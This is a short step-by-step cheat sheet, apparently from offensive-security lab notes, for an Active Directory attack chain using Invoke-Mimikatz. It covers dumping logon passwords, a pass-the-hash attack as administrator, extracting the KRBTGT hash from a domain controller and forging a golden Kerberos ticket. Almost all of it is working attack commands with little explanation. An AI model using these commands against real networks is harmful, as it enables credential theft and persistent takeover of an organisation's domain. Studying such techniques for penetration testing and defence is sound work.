- Open command prompt whith run as administrator to dump and do pth attack to the administrator user
```
Invoke-Mimikatz -command '"privilege::debug" "sekurlsa::logonpasswords"'

```
- Perform Pth attack 
```
Invoke-Mimikatz -command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:ntlmhash /run:powershell.exe"'
```
- And dump KRBTGT hash with the admimistrator user access
```
Invoke-Mimikatz -command '"lsadump::lsa /patch"' -computername prod.research.security.local
```

- Perform Final golden attack
```
Invoke-Mimikatz -command '"kerberos::golden /user:administrator /domain:research.security.local /sid:domain_sid /krbtgt:above_enumerated_krbtgt /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
